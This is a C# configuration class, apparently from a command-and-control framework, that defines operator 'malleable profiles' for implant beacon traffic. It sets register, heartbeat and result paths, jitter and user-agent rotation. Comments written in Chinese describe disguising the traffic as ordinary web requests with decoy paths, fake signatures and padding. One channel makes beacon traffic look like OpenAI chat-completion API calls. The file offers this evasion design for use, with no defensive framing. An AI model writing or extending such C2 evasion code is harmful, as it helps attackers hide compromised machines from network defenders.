namespace LibraNextgen.Service.Profiles;

/// <summary>
/// Persistable malleable profile configuration stored in MongoDB.
/// Operators can create custom profiles to shape agent traffic.
/// </summary>
public class MalleableProfileConfig
{
    public string Id { get; set; } = Guid.NewGuid().ToString("N");
    public string Name { get; set; } = string.Empty;
    public string Description { get; set; } = string.Empty;
    public bool IsActive { get; set; }
    public DateTime CreatedAt { get; set; } = DateTime.UtcNow;
    public string CreatedBy { get; set; } = string.Empty;

    public string RegisterPath { get; set; } = "/api/beacon/register";
    public string HeartbeatPath { get; set; } = "/api/beacon/heartbeat";
    public string ResultPath { get; set; } = "/api/beacon/result";
    public string WebSocketPath { get; set; } = "/ws/chat";

    public string UserAgent { get; set; } = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
    public Dictionary<string, string> CustomHeaders { get; set; } = new();

    public int HeartbeatIntervalSeconds { get; set; } = 30;
    public double JitterPercent { get; set; } = 0.2;

    // ── 流量伪装（单入口内部路由）────────────────────────────────────

    /// 单入口路径前缀（如 /api、/index.php）。之后的路径段全部忽略。
    public string EntryPath { get; set; } = "/api";

    /// 虚假业务路径段列表：agent 每次请求随机拼一个后缀。
    public List<string> PathSuffixes { get; set; } = new()
    {
        "user/info", "orders/list", "profile", "settings",
        "notifications", "messages/unread", "search/history",
    };

    /// 外层壳：密文字段名。
    public string DataKey { get; set; } = "d";
    /// 外层壳：时间戳字段名。
    public string TsKey { get; set; } = "ts";
    /// 外层壳：随机字段名。
    public string RandKey { get; set; } = "r";
    /// 外层壳：假签名字段名（空 = 不加签名）。
    public string SignKey { get; set; } = "sign";
    /// 外层壳：会话 token 字段名（服务端路由用）。
    public string TokenKey { get; set; } = "sid";

    /// UA 轮换列表（空 = 使用 UserAgent）。
    public List<string> UserAgents { get; set; } = new();

    /// 密文长度随机化：明文尾部随机 padding 字符数范围。
    public int PaddingMin { get; set; } = 0;
    public int PaddingMax { get; set; } = 64;

    // ── AI 通道（v1/chat/completions + SSE 伪装）────────────────────

    /// AI 通道伪装路径。
    public string AiPath { get; set; } = "/v1/chat/completions";

    /// 模型名池（请求随机选一个，需为真实存在的模型名）。
    public List<string> AiModels { get; set; } = new()
    {
        "gpt-4o-mini", "gpt-4o", "gpt-4.1-mini",
    };

    /// Authorization 前缀（默认 sk-）。
    public string AuthPrefix { get; set; } = "sk-";
}
